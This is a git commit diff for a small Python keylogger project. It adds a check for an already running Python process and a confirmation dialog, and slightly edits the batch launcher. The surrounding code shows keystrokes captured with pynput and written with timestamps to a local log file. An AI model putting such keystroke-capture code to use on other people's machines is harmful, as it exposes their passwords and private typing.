f5f35da9295345af3af030ad264d0aeba2e00518
Coke1063 <141168240+Coke1063@users.noreply.github.com>
2023-12-22 00:24:28 -0500

    Added a python task detection to attempt to avoid multiple instances of keylogger being active

--- Keylogger.py
+++ Keylogger.py
@@ -1,13 +1,32 @@
 from pynput.keyboard import Listener
 import logging
 import os
+import pyautogui as pt
+import psutil
+
+
+def is_python_running():
+    for process in psutil.process_iter(['pid', 'name']):
+        if process.info['name'] == 'Python.exe':
+            return True
+    return False
+
+
+if is_python_running():
+    pyconfirm = pt.confirm("An instance of Python is already running. Please make sure that it isn't an instance of "
+                           "the keylogger"
+                           "before starting, as it will become buggy. Do you want to start the keylogger?")
+    if pyconfirm == 'OK':
+        pass
+    else:
+        exit()
 
 log_dir = os.path.dirname(os.path.abspath(__file__))
 
-logging.basicConfig(filename=os.path.join(log_dir,'Key_log.txt'),
+logging.basicConfig(filename=os.path.join(log_dir, 'Key_log.txt'),
                     format='%(asctime)s %(message)s',
                     datefmt='%m-%d-%Y %H:%M:%S',
-                    level=logging.DEBUG,)
+                    level=logging.DEBUG, )
 
 
 def on_press(key):
--- Start Keylogger.bat
+++ Start Keylogger.bat
@@ -1,4 +1,4 @@
+@echo off
 set "rootDir=%~dp0"
 %rootDir%\venv\Scripts\python.exe Keylogger.py
-echo Close the terminal to stop keylogging
 pause
